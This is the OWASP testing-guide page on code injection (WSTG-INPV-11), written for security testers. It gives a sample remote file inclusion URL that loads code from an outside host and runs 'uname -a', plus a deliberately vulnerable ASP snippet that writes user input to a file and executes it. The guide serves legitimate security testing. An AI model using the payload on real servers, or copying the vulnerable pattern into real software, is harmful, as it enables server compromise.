# WSTG - Latest
[Home](https://owasp.org/www-project-web-security-testing-guide/) > [Latest](https://owasp.org/www-project-web-security-testing-guide/latest/) > [4-Web Application Security Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/) > [07-Input Validation Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/)
# Testing for Code Injection
ID  
---  
WSTG-INPV-11  
## Summary
This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.
In [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.
## Test Objectives
  * Identify injection points where you can inject code into the application.
  * Assess the injection severity.


## How to Test
### Black-Box Testing
#### Testing for PHP Injection Vulnerabilities
Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:
`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`
> The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.
### Gray-Box Testing
#### Testing for ASP Code Injection Vulnerabilities
Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:
```
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))

```

### Spotlight: Xeol
[![image](https://owasp.org/assets/images/corp-member-logo/Xeol.jpeg)](https://www.xeol.io/)
Xeol helps secure your software supply chain from code to deploy. We believe that software should not only be free of vulnerabilities but also built and deployed by trusted entities. Xeol starts by managing your open source dependencies. Helping you evaluate them based on vulnerabilities, end-of-life status, maintainability, and licensing. Xeol then helps you sign then verify your images at build before they are deployed to production.
## Corporate Supporters
[![image](https://owasp.org/assets/images/corp-member-logo/Arnica.png)](https://www.arnica.io)[![image](https://owasp.org/assets/images/corp-member-logo/bionic_logo_1.png)](https://www.bionic.ai/)[![image](https://owasp.org/assets/images/corp-member-logo/SecureCodeWarrior.png)](https://www.securecodewarrior.com/)[![image](https://owasp.org/assets/images/corp-member-logo/SKUDONET.png)](https://www.skudonet.com)[![image](https://owasp.org/assets/images/corp-member-logo/invicti_logo_300x90_black.png)](https://www.invicti.com/)[![image](https://owasp.org/assets/images/corp-member-logo/Scitum.png)](https://www.scitum.com.mx/)[![image](https://owasp.org/assets/images/corp-member-logo/DefectDojo.png)](https://www.defectdojo.com/)[![image](https://owasp.org/assets/images/corp-member-logo/FujitsuLimited.png)](https://global.fujitsu/en-global)[![image](https://owasp.org/assets/images/corp-member-logo/fortify__logo__normal2x_1.png)](https://www.microfocus.com/en-us/cyberres/application-security)
[Become a corporate supporter](https://owasp.org/supporters)
[](https://github.com/OWASP/) [](https://owasp.org/slack/invite) [](https://www.facebook.com/OWASPFoundation) [](https://infosec.exchange/@owasp) [](https://twitter.com/owasp) [](https://www.linkedin.com/company/owasp/) [](https://www.youtube.com/user/OWASPGLOBAL)
  * [HOME](https://owasp.org/)
  * [PROJECTS](https://owasp.org/projects/)
  * [CHAPTERS](https://owasp.org/chapters/)
  * [EVENTS](https://owasp.org/events/)
  * [ABOUT](https://owasp.org/about/)
  * [PRIVACY](https://owasp.org/www-policy/operational/privacy)
  * [SITEMAP](https://owasp.org/sitemap/)
  * [CONTACT](https://owasp.org/contact/)


OWASP, the OWASP logo, and Global AppSec are registered trademarks and AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference, and LASCON are trademarks of the OWASP Foundation, Inc. Unless otherwise specified, all content on the site is Creative Commons Attribution-ShareAlike v4.0 and provided without warranty of service or accuracy. For more information, please refer to our [General Disclaimer](https://owasp.org/www-policy/operational/general-disclaimer.html). OWASP does not endorse or recommend commercial products or services, allowing our community to remain vendor neutral with the collective wisdom of the best minds in software security worldwide. Copyright 2025, OWASP Foundation, Inc. 
